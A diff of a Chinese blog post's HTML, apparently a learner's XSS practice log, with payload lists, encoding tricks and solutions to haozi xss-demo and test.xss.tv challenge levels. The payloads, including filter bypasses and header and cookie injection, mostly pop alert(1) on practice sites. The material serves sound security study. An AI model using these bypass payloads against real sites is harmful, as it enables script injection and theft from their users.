@@ -166,9 +166,9 @@
       <div class="py-5 z-depth-3" id="board">
         <div class="post-content mx-auto" id="post">
           <div class="markdown-body">
-            <h3><span id="0x01-一些资源或文章">0x01 一些资源或文章：</span></h3><p><a href="https://xz.aliyun.com/t/2936" target="_blank" rel="noopener">XSS小结</a><br><a href="https://xz.aliyun.com/t/4067" target="_blank" rel="noopener">XSS总结</a><br><a href="https://www.leavesongs.com/PENETRATION/xss-collect.html" target="_blank" rel="noopener">那些年我们没能bypass的xss filter</a><br><a href="https://www.zybuluo.com/laodao/note/9592" target="_blank" rel="noopener">XSS Filter Evasion Cheat Sheet 中文版</a><br><a href="https://v0w.top/2018/08/18/XSS%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5&amp;%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/#%E5%88%9D%E6%8E%A2XSS-Payload" target="_blank" rel="noopener">XSS攻击手段&amp;在CTF中的运用</a></p>
+            <h3 id="0x01-一些资源或文章："><a href="#0x01-一些资源或文章：" class="headerlink" title="0x01 一些资源或文章："></a>0x01 一些资源或文章：</h3><p><a href="https://xz.aliyun.com/t/2936" target="_blank" rel="noopener">XSS小结</a><br><a href="https://xz.aliyun.com/t/4067" target="_blank" rel="noopener">XSS总结</a><br><a href="https://www.leavesongs.com/PENETRATION/xss-collect.html" target="_blank" rel="noopener">那些年我们没能bypass的xss filter</a><br><a href="https://www.zybuluo.com/laodao/note/9592" target="_blank" rel="noopener">XSS Filter Evasion Cheat Sheet 中文版</a><br><a href="https://v0w.top/2018/08/18/XSS%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5&amp;%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/#%E5%88%9D%E6%8E%A2XSS-Payload" target="_blank" rel="noopener">XSS攻击手段&amp;在CTF中的运用</a></p>
 <p><br></p>
-<h3><span id="0x02-常用payload慢慢积累">0x02 常用Payload（慢慢积累…）</span></h3><pre><code>&lt;img src=&quot;x&quot; onerror=alert(1)&gt;
+<h3 id="0x02-常用Payload（慢慢积累…）"><a href="#0x02-常用Payload（慢慢积累…）" class="headerlink" title="0x02 常用Payload（慢慢积累…）"></a>0x02 常用Payload（慢慢积累…）</h3><pre><code>&lt;img src=&quot;x&quot; onerror=alert(1)&gt;
 &lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#39;xss&#39;)&quot;)&gt;
 &lt;img src=1 onmouseover=alert(&#39;xss&#39;)&gt;
 </code></pre><pre><code>&lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;aa&lt;/a&gt;
@@ -208,24 +208,24 @@ nc监听端口1234
 - ſ 符号转换为大写后正好为大写字母 S
 - 可以用 %0a 代替空格进行绕过
 </code></pre><p><br></p>
-<h3><span id="0x03-xss编码">0x03 XSS编码</span></h3><h5><span id="js编码">JS编码</span></h5><p>JS提供了四种字符编码的策略，</p>
+<h3 id="0x03-XSS编码"><a href="#0x03-XSS编码" class="headerlink" title="0x03 XSS编码"></a>0x03 XSS编码</h3><h5 id="JS编码"><a href="#JS编码" class="headerlink" title="JS编码"></a>JS编码</h5><p>JS提供了四种字符编码的策略，</p>
 <ul>
 <li>三个八进制数字，如果数字不够，在前面补零，如a的编码为<code>\141</code></li>
 <li>两个十六进制数字，如果数字不够，在前面补零，如a的编码为<code>\x61</code></li>
 <li>四个十六进制数字，如果数字不够，在前面补零，如a的编码为<code>\u0061</code></li>
 <li>对于一些控制字符，使用特殊的C类型的转义风格，如<code>\n</code>和<code>\r</code></li>
 </ul>
-<h5><span id="html实体编码">HTML实体编码</span></h5><p><strong>命名实体</strong><br>以<code>&amp;</code>开头，以分号结尾的，如<code>&lt;</code>的编码为<code>&amp;1t;</code></p>
+<h5 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h5><p><strong>命名实体</strong><br>以<code>&amp;</code>开头，以分号结尾的，如<code>&lt;</code>的编码为<code>&amp;1t;</code></p>
 <p><strong>字符编码</strong><br>十进制，十六进制的ASCII码或者Unicode字符编码。样式为<code>&amp;#</code>数值;</p>
 <p>如<code>&lt;</code>的编码为</p>
 <p><code>&amp;#60;</code>(10进制)</p>
 <p><code>&amp;#x003c;</code>(16进制)</p>
-<h5><span id="url编码">URL编码</span></h5><p>这里为url全编码，也就是两次url编码</p>
+<h5 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h5><p>这里为url全编码，也就是两次url编码</p>
 <p>如alert的url全编码<code>为%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34</code></p>
-<h5><span id="stringfromcharcode编码">String.fromCharCode编码</span></h5><p>如alert的编码为<code>String.fromCharCode(97,108,101,114,116)</code></p>
+<h5 id="String-fromCharCode编码"><a href="#String-fromCharCode编码" class="headerlink" title="String.fromCharCode编码"></a>String.fromCharCode编码</h5><p>如alert的编码为<code>String.fromCharCode(97,108,101,114,116)</code></p>
 <p><br></p>
-<h3><span id="0x04-刷题">0x04 刷题</span></h3><h4><span id="haozi-xss-demo">haozi-xss-demo</span></h4><p>项目：<a href="https://github.com/haozi/xss-demo" target="_blank" rel="noopener">https://github.com/haozi/xss-demo</a><br>地址：<a href="https://xss.haozi.me" target="_blank" rel="noopener">https://xss.haozi.me</a><br>包含alert(1)的js文件地址：<a href="https://xss.haozi.me/j.js" target="_blank" rel="noopener">https://xss.haozi.me/j.js</a><br>过关方式：构造input code，成功执行alert(1)</p>
-<h6><span id="0x00">0x00</span></h6><p><strong>server code:</strong></p>
+<h3 id="0x04-刷题"><a href="#0x04-刷题" class="headerlink" title="0x04 刷题"></a>0x04 刷题</h3><h4 id="haozi-xss-demo"><a href="#haozi-xss-demo" class="headerlink" title="haozi-xss-demo"></a>haozi-xss-demo</h4><p>项目：<a href="https://github.com/haozi/xss-demo" target="_blank" rel="noopener">https://github.com/haozi/xss-demo</a><br>地址：<a href="https://xss.haozi.me" target="_blank" rel="noopener">https://xss.haozi.me</a><br>包含alert(1)的js文件地址：<a href="https://xss.haozi.me/j.js" target="_blank" rel="noopener">https://xss.haozi.me/j.js</a><br>过关方式：构造input code，成功执行alert(1)</p>
+<h6 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h6><p><strong>server code:</strong></p>
 <pre><code class="php">function render (input) {
   return &#39;&lt;div&gt;&#39; + input + &#39;&lt;/div&gt;&#39;
 }
@@ -238,7 +238,7 @@ nc监听端口1234
 <pre><code class="html">&lt;div&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/div&gt;
 </code></pre>
 <p><br></p>
-<h6><span id="0x01">0x01</span></h6><p><strong>server code:</strong></p>
+<h6 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h6><p><strong>server code:</strong></p>
 <pre><code class="javascript">function render (input) {
   return &#39;&lt;textarea&gt;&#39; + input + &#39;&lt;/textarea&gt;&#39;
 }
@@ -250,7 +250,7 @@ nc监听端口1234
 <pre><code class="html">&lt;textarea&gt;&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/textarea&gt;
 </code></pre>
 <p><br></p>
-<h6><span id="0x02">0x02</span></h6><p><strong>server code:</strong></p>
+<h6 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h6><p><strong>server code:</strong></p>
 <pre><code class="javascript">function render (input) {
   return &#39;&lt;input type=&quot;name&quot; value=&quot;&#39; + input + &#39;&quot;&gt;&#39;
 }
@@ -262,7 +262,7 @@ nc监听端口1234
 <pre><code class="html">&lt;input type=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;
 </code></pre>
 <p><br></p>
-<h6><span id="0x03">0x03</span></h6><p><strong>server code:</strong></p>
+<h6 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h6><p><strong>server code:</strong></p>
 <pre><code class="javascript">function render (input) {
   const stripBracketsRe = /[()]/g
   input = input.replace(stripBracketsRe, &#39;&#39;)
@@ -278,7 +278,7 @@ nc监听端口1234
 <pre><code class="html">&lt;script&gt;alert`1`&lt;/script&gt;
 </code></pre>
 <p><br></p>
-<h6><span id="0x04">0x04</span></h6><p><strong>server code:</strong></p>
+<h6 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h6><p><strong>server code:</strong></p>
 <pre><code class="javascript">function render (input) {
   const stripBracketsRe = /[()`]/g
   input = input.replace(stripBracketsRe, &#39;&#39;)
@@ -299,7 +299,7 @@ nc监听端口1234
 &lt;iframe srcdoc=&quot;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&quot;&gt;
 </code></pre>
 <p><br></p>
-<h6><span id="0x05">0x05</span></h6><p><strong>server code:</strong></p>
+<h6 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h6><p><strong>server code:</strong></p>
 <pre><code class="javascript">function render (input) {
   input = input.replace(/--&gt;/g, &#39;😂&#39;)
   return &#39;&lt;!-- &#39; + input + &#39; --&gt;&#39;
@@ -314,7 +314,7 @@ nc监听端口1234
 <pre><code class="html">&lt;!-- --!&gt;&lt;script&gt;alert(1)&lt;/script&gt; 
 </code></pre>
 <p><br></p>
-<h6><span id="0x06">0x06</span></h6><p><strong>server code:</strong></p>
+<h6 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h6><p><strong>server code:</strong></p>
 <pre><code class="javascript">function render (input) {
   input = input.replace(/auto|on.*=|&gt;/ig, &#39;_&#39;)
   return `&lt;input value=1 ${input} type=&quot;text&quot;&gt;`
@@ -338,7 +338,7 @@ type=image src onerror
 =alert(1) type=&quot;text&quot;&gt;
 </code></pre>
 <p><br></p>
-<h6><span id="0x07">0x07</span></h6><p><strong>server code:</strong></p>
+<h6 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h6><p><strong>server code:</strong></p>
 <pre><code class="javascript">function render (input) {
   const stripTagsRe = /&lt;\/?[^&gt;]+&gt;/gi
 
@@ -356,7 +356,7 @@ type=image src onerror
 &lt;/article&gt;
 </code></pre>
 <p><br></p>
-<h6><span id="0x08">0x08</span></h6><p><strong>server code:</strong></p>
+<h6 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h6><p><strong>server code:</strong></p>
 <pre><code class="javascript">function render (src) {
   src = src.replace(/&lt;\/style&gt;/ig, &#39;/* \u574F\u4EBA */&#39;)
   return `
@@ -379,7 +379,7 @@ type=image src onerror
     &lt;/style&gt;
 </code></pre>
 <p><br></p>
-<h6><span id="0x09">0x09</span></h6><p><strong>server code:</strong></p>
+<h6 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h6><p><strong>server code:</strong></p>
 <pre><code class="javascript">function render (input) {
   let domainRe = /^https?:\/\/www\.segmentfault\.com/
   if (domainRe.test(input)) {
@@ -396,7 +396,7 @@ type=image src onerror
 <pre><code class="html">&lt;script src=&quot;https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;a href=&quot;&quot; onmouseover=alert(1)&gt;Lethe&lt;/a&gt;&quot;&gt;&lt;/script&gt;
 </code></pre>
 <p><br></p>
-<h6><span id="0x0a">0x0A</span></h6><p><strong>server code:</strong></p>
+<h6 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h6><p><strong>server code:</strong></p>
 <pre><code class="javascript">function render (input) {
   function escapeHtml(s) {
     return s.replace(/&amp;/g, &#39;&amp;amp;&#39;)
@@ -426,7 +426,7 @@ type=image src onerror
 <pre><code class="html">&lt;script src=&quot;https:&amp;#x2f&amp;#x2fwww.segmentfault.com@xss.haozi.me&amp;#x2fj.js&quot;&gt;&lt;/script&gt;
 </code></pre>
 <p><br></p>
-<h6><span id="0x0b">0x0B</span></h6><p><strong>server code:</strong></p>
+<h6 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h6><p><strong>server code:</strong></p>
 <pre><code class="javascript">function render (input) {
   input = input.toUpperCase()
   return `&lt;h1&gt;${input}&lt;/h1&gt;`
@@ -447,7 +447,7 @@ type=image src onerror
 <pre><code class="html">&lt;h1&gt;&lt;IMG SRC=&quot;X&quot; ONERROR=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;&gt;&lt;/h1&gt;
 </code></pre>
 <p><br></p>
-<h6><span id="0x0c">0x0C</span></h6><p><strong>server code:</strong></p>
+<h6 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h6><p><strong>server code:</strong></p>
 <pre><code class="javascript">function render (input) {
   input = input.replace(/script/ig, &#39;&#39;)
   input = input.toUpperCase()
@@ -463,7 +463,7 @@ type=image src onerror
 <pre><code class="html">&lt;h1&gt;&lt;SCRIPT SRC=&quot;HTTPS://WWW.SEGMENTFAULT.COM.HAOZI.ME/J.JS&quot;&gt;&lt;/SCRIPT&gt;&gt;&lt;/h1&gt;
 </code></pre>
 <p><br></p>
-<h6><span id="0x0d">0x0D</span></h6><p><strong>server code:</strong></p>
+<h6 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h6><p><strong>server code:</strong></p>
 <pre><code class="javascript">function render (input) {
   input = input.replace(/[&lt;/&quot;&#39;]/g, &#39;&#39;)
   return `
@@ -488,7 +488,7 @@ alert(1);
     &lt;/script&gt;
 </code></pre>
 <p><br></p>
-<h6><span id="0x0e">0x0E</span></h6><p><strong>server code:</strong></p>
+<h6 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h6><p><strong>server code:</strong></p>
 <pre><code class="javascript">function render (input) {
   input = input.replace(/&lt;([a-zA-Z])/g, &#39;&lt;_$1&#39;)
   input = input.toUpperCase()
@@ -504,7 +504,7 @@ alert(1);
 <pre><code class="html">&lt;h1&gt;&lt;SCRIPT SRC=&quot;HTTPS://WWW.SEGMENTFAULT.COM.HAOZI.ME/J.JS&quot;&gt;&lt;/SCRIPT&gt;&lt;/h1&gt;
 </code></pre>
 <p><br></p>
-<h6><span id="0x0f">0x0F</span></h6><p><strong>server code:</strong></p>
+<h6 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h6><p><strong>server code:</strong></p>
 <pre><code class="javascript">function render (input) {
   function escapeHtml(s) {
     return s.replace(/&amp;/g, &#39;&amp;amp;&#39;)
@@ -528,7 +528,7 @@ alert(1);
 &lt;img src onerror=&quot;console.error(&#39;&#39;);alert(&#39;1&#39;)&quot;&gt;
 </code></pre>
 <p><br></p>
-<h6><span id="0x10">0x10</span></h6><p><strong>server code:</strong></p>
+<h6 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h6><p><strong>server code:</strong></p>
 <pre><code class="javascript">function render (input) {
   return `
 &lt;script&gt;
@@ -547,7 +547,7 @@ alert(1);
 &lt;/script&gt;
 </code></pre>
 <p><br></p>
-<h6><span id="0x11">0x11</span></h6><p><strong>server code:</strong></p>
+<h6 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h6><p><strong>server code:</strong></p>
 <pre><code class="javascript">// from alf.nu
 function render (s) {
   function escapeJs (s) {
@@ -596,7 +596,7 @@ function render (s) {
 &lt;/script&gt;
 </code></pre>
 <p><br></p>
-<h6><span id="0x12">0x12</span></h6><p><strong>server code:</strong></p>
+<h6 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h6><p><strong>server code:</strong></p>
 <pre><code class="javascript">// from alf.nu
 function escape (s) {
   s = s.replace(/&quot;/g, &#39;\\&quot;&#39;)
@@ -613,36 +613,36 @@ function escape (s) {
 <p>这一套题主要是熟悉一下基本绕过方式，实战性不是很强，初学XSS还需继续努力。</p>
 <p><br></p>
 <p>那么就再刷一套题吧</p>
-<h4><span id="xss挑战">XSS挑战</span></h4><p>题目地址：<a href="http://test.xss.tv/" target="_blank" rel="noopener">http://test.xss.tv/</a></p>
-<h5><span id="level-1">Level 1</span></h5><p>输入的地方，在h2标签内，先闭合标签再构造。</p>
+<h4 id="XSS挑战"><a href="#XSS挑战" class="headerlink" title="XSS挑战"></a>XSS挑战</h4><p>题目地址：<a href="http://test.xss.tv/" target="_blank" rel="noopener">http://test.xss.tv/</a></p>
+<h5 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h5><p>输入的地方，在h2标签内，先闭合标签再构造。</p>
 <p>payload：<br><code>&lt;/h2&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
 <p><br></p>
-<h5><span id="level-2">Level 2</span></h5><p><code>&lt;input name=&quot;keyword&quot; value=&quot;input code&quot;&gt;</code></p>
+<h5 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h5><p><code>&lt;input name=&quot;keyword&quot; value=&quot;input code&quot;&gt;</code></p>
 <p>输入点在<code>input标签内部</code>，所以先闭合<code>input</code>标签。</p>
 <p>payload：<br><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
 <p><br></p>
-<h5><span id="level-3">Level 3</span></h5><p>这一关输入点，同样在<code>input</code>标签的<code>value</code>值内，尝试上一关闭合标签构造，但是没有成功。</p>
+<h5 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h5><p>这一关输入点，同样在<code>input</code>标签的<code>value</code>值内，尝试上一关闭合标签构造，但是没有成功。</p>
 <p>双引号闭合<code>value=&quot;</code>失败，单引号闭合成功。<br>然后利用onclick、onmouseover等事件进行弹窗。<br>注释掉后面的代码。</p>
 <p>payload:<br><code>&#39; onmouseover=alert(1)//</code></p>
 <p><br></p>
-<h5><span id="level-4">Level 4</span></h5><p>与上一关类似，用双引号闭合<code>value=&quot;</code>即可。</p>
+<h5 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h5><p>与上一关类似，用双引号闭合<code>value=&quot;</code>即可。</p>
 <p>payload:<br><code>&quot; onclick=alert(1)//</code><br><br></p>
-<h5><span id="level-5">Level 5</span></h5><p>这一关会将<code>script</code>替换成<code>scr_ipt</code>，<code>on</code>也会被替换成<code>o_n</code>。</p>
+<h5 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h5><p>这一关会将<code>script</code>替换成<code>scr_ipt</code>，<code>on</code>也会被替换成<code>o_n</code>。</p>
 <p>我们可以闭合<code>&lt;input&gt;</code>后利用<code>&lt;a&gt;</code>标签进行弹窗：</p>
 <p>payload:<br><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;Lethe&lt;/a&gt;//</code><br><br></p>
-<h5><span id="level-6">Level 6</span></h5><p>这一关在上一关的基础上，多过滤了<code>href</code>、<code>src</code>、<code>data</code>。</p>
+<h5 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h5><p>这一关在上一关的基础上，多过滤了<code>href</code>、<code>src</code>、<code>data</code>。</p>
 <p>经测试，可以利用大小写进行绕过。</p>
 <p>payload：<br><code>&quot;&gt;&lt;a hREf=&quot;javascript:alert(1)&quot;&gt;Lethe&lt;/a&gt;//</code><br><br></p>
-<h5><span id="level-7">Level 7</span></h5><p>先用之前的payload进行测试，发现<code>href</code>和<code>script</code>直接消失了，于是尝试双写绕过，成功。</p>
+<h5 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h5><p>先用之前的payload进行测试，发现<code>href</code>和<code>script</code>直接消失了，于是尝试双写绕过，成功。</p>
 <p>payload:<br><code>&quot;&gt;&lt;a hrhrefef=&quot;javascriscriptpt:alert(1)&quot;&gt;Lethe&lt;/a&gt;//</code><br><br></p>
-<h5><span id="level-8">Level 8</span></h5><p>这一关和前面稍有不同，可以添加友情链接，添加过后的内容直接包含在<code>&lt;a href=&quot;input code&quot;&gt;友情链接&lt;/a&gt;</code>里面。</p>
+<h5 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h5><p>这一关和前面稍有不同，可以添加友情链接，添加过后的内容直接包含在<code>&lt;a href=&quot;input code&quot;&gt;友情链接&lt;/a&gt;</code>里面。</p>
 <p>于是先尝试<code>javascritpt:alert(1)</code>，但是<code>script</code>同样被替换成了<code>scr_ipt</code>。</p>
 <p>因为html标签内可以直接解析html实体编码，于是尝试用实体编码绕过。</p>
 <p>payload:<br><code>java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1)</code><br><br></p>
-<h5><span id="level-9">Level 9</span></h5><p>和上题类似，但是这里对链接有了一定要求，必须包含<code>http://</code>，却没有要求一定要在开头….不知道有什么意义</p>
+<h5 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h5><p>和上题类似，但是这里对链接有了一定要求，必须包含<code>http://</code>，却没有要求一定要在开头….不知道有什么意义</p>
 <p>所以直接在构造的语句最后加上<code>http://</code>绕过检测，再注释掉即可。</p>
 <p>payload：<br><code>java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1)//http://</code><br><br></p>
-<h5><span id="level-10">Level 10</span></h5><p>这题没有输入框，url上给了一个keyword参数，尝试闭合再构造，虽然回显的内容没有过滤，但是却不会弹窗，查看源码，发现还有一个隐藏的form表单，看看能否利用。</p>
+<h5 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h5><p>这题没有输入框，url上给了一个keyword参数，尝试闭合再构造，虽然回显的内容没有过滤，但是却不会弹窗，查看源码，发现还有一个隐藏的form表单，看看能否利用。</p>
 <p><img src="/2019/07/30/XSS刷题之旅/20190730195539277.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>尝试<code>?t_link=Lethe&amp;t_history=Lethe&amp;t_sort=Lethe</code></p>
 <p>发现<code>t_sort</code>参数可以利用</p>
@@ -650,7 +650,7 @@ function escape (s) {
 <p>于是进行构造，发现尖括号被过滤了，于是利用事件进行弹窗。</p>
 <p>payload:<br><code>?t_sort=&quot; type=image src=x onerror=alert(1)//</code></p>
 <p><br></p>
-<h5><span id="level-11">Level 11</span></h5><p>和上一关一样有一个隐藏的表单，也是<code>t_sort</code>参数可以利用</p>
+<h5 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h5><p>和上一关一样有一个隐藏的表单，也是<code>t_sort</code>参数可以利用</p>
 <p><img src="/2019/07/30/XSS刷题之旅/2019073020054445.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>用上一关的payload进行测试，发现双引号也被过滤了，应该又要换个思路了。</p>
 <p>重新打开页面观察源码，看到一个可疑的地方，那新增的一个参数不是白加的，当你从第10关跳到第11关时，<code>t_ref</code>的value值是页面的Referer的值。</p>
@@ -660,21 +660,21 @@ function escape (s) {
 <p>然后在Target界面Forward，回到闯关页面发现已成功注，点击输入框即可弹窗。</p>
 <p><img src="/2019/07/30/XSS刷题之旅/20190730202044406.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
-<h5><span id="level-12">Level 12</span></h5><p>与上一关类似，不过这里是利用User-Agent:</p>
+<h5 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h5><p>与上一关类似，不过这里是利用User-Agent:</p>
 <p><img src="/2019/07/30/XSS刷题之旅/20190730202249699.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>同样抓包修改User-Agent的值进行构造</p>
 <p><img src="/2019/07/30/XSS刷题之旅/20190730202431311.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>payload:<br><code>&quot; type=text onclick=&quot;alert(1)</code></p>
 <p><br></p>
-<h5><span id="level-13">Level 13</span></h5><p>与前两关相同，只不过这一关是利用Cookie进行注入。</p>
+<h5 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h5><p>与前两关相同，只不过这一关是利用Cookie进行注入。</p>
 <p><img src="/2019/07/30/XSS刷题之旅/20190730202710641.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>抓包修改Cookie为：<code>user=&quot; type=text onclick=&quot;alert(1)</code>即可</p>
 <p><img src="/2019/07/30/XSS刷题之旅/2019073020292078.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
-<h5><span id="level-14">Level 14</span></h5><p>进入14关，没有输入框，url中没有参数，查看源码，发现使用了<code>&lt;iframe&gt;</code>标签引入了<code>http://www.exifviewer.org/</code></p>
+<h5 id="Level-14"><a href="#Level-14" class="headerlink" title="Level 14"></a>Level 14</h5><p>进入14关，没有输入框，url中没有参数，查看源码，发现使用了<code>&lt;iframe&gt;</code>标签引入了<code>http://www.exifviewer.org/</code></p>
 <p>但是我这边一直打不开<code>http://www.exifviewer.org/</code>，根据网上的题解，上传一个含有xss代码的图片触发xss，关于exif xss这一题的解法，可参考:<a href="https://xz.aliyun.com/t/1206" target="_blank" rel="noopener">https://xz.aliyun.com/t/1206</a></p>
 <p><br></p>
-<h5><span id="level-15">Level 15</span></h5><p>页面什么都没有，那么直接看源码</p>
+<h5 id="Level-15"><a href="#Level-15" class="headerlink" title="Level 15"></a>Level 15</h5><p>页面什么都没有，那么直接看源码</p>
 <p><img src="/2019/07/30/XSS刷题之旅/20190730204024883.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>第一眼看貌似也没什么，实际上还是因为我对js不是很熟悉…搜索得到，这里使用了AngularJS框架的 <code>ng-include</code> 指令，可参考：<a href="https://www.runoob.com/angularjs/ng-ng-include.html" target="_blank" rel="noopener">https://www.runoob.com/angularjs/ng-ng-include.html</a></p>
 <p>其实就是可以利用 <code>ng-include</code> 指令来包含文件&gt;</p>
@@ -687,20 +687,20 @@ function escape (s) {
 <p>发现真的是可以的..</p>
 <p><img src="/2019/07/30/XSS刷题之旅/2019073021103933.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
-<h5><span id="level-16">Level 16</span></h5><p>输入点包含在<code>&lt;center&gt;</code>标签内，过滤了空格，可以用<code>%0a</code>代替空格进行绕过。</p>
+<h5 id="Level-16"><a href="#Level-16" class="headerlink" title="Level 16"></a>Level 16</h5><p>输入点包含在<code>&lt;center&gt;</code>标签内，过滤了空格，可以用<code>%0a</code>代替空格进行绕过。</p>
 <p>payload:<br><code>?keyword=&lt;img%0asrc=x%0aonerror=alert(1)&gt;</code><br><br></p>
-<h5><span id="level-17">Level 17</span></h5><p>进入之后会看到一个关于flash的什么东西，暂时先不管，做xss先找输入输出点。</p>
+<h5 id="Level-17"><a href="#Level-17" class="headerlink" title="Level 17"></a>Level 17</h5><p>进入之后会看到一个关于flash的什么东西，暂时先不管，做xss先找输入输出点。</p>
 <p>url中有<code>arg01</code>和<code>arg02</code>两个参数，应该是输入点，查看源码发现在<code>&lt;embed&gt;</code>标签的<code>src</code>中会输出这两个参数的值，如下：</p>
 <p><img src="/2019/07/30/XSS刷题之旅/20190730211932413.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>先试试闭合，发现过滤了尖括号，可以考虑用<code>onerror</code>弹窗。</p>
 <p>payload：<br><code>?arg01=&amp;arg02= onmouseover=alert(1)</code></p>
 <p><br></p>
-<h5><span id="level-18">Level 18</span></h5><p>这一关和17关好像是一样的…</p>
+<h5 id="Level-18"><a href="#Level-18" class="headerlink" title="Level 18"></a>Level 18</h5><p>这一关和17关好像是一样的…</p>
 <p>payload:<br><code>?arg01=&amp;arg02= onmouseover=alert(1)</code></p>
 <p><br></p>
 <p> Level 19 20 好像是关于flash xss的，由于了解不多，而且现在网站用flash的也越来越少了，就不做了。</p>
 <p><br></p>
-<h3><span id="0x05-小结">0x05 小结</span></h3><p>做了这两套题，这只能说是刚刚了解了XSS是什么，还要很多很多知识需要学习，尤其是要加强实战方面的运用，这就只能在以后的学习过程中慢慢积累了。</p>
+<h3 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h3><p>做了这两套题，这只能说是刚刚了解了XSS是什么，还要很多很多知识需要学习，尤其是要加强实战方面的运用，这就只能在以后的学习过程中慢慢积累了。</p>
 
             <hr>
           </div>
